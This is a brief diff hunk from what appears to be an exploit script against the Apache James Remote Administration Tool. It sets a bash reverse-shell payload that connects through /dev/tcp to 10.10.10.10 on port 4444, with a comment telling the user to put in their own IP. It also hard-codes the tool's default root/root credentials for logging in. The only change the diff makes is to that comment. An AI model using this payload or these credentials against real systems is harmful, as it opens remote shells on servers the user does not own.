@@ -17,7 +17,7 @@ from subprocess import call
 
 # specify payload
 #payload = 'touch /tmp/proof.txt' # to exploit on any user 
-payload = 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' # Spawn a reverse shell
+payload = 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' # Replace 10.10.10.10 with your IP
 # credentials to James Remote Administration Tool (Default - root/root)
 user = 'root'
 pwd = 'root'
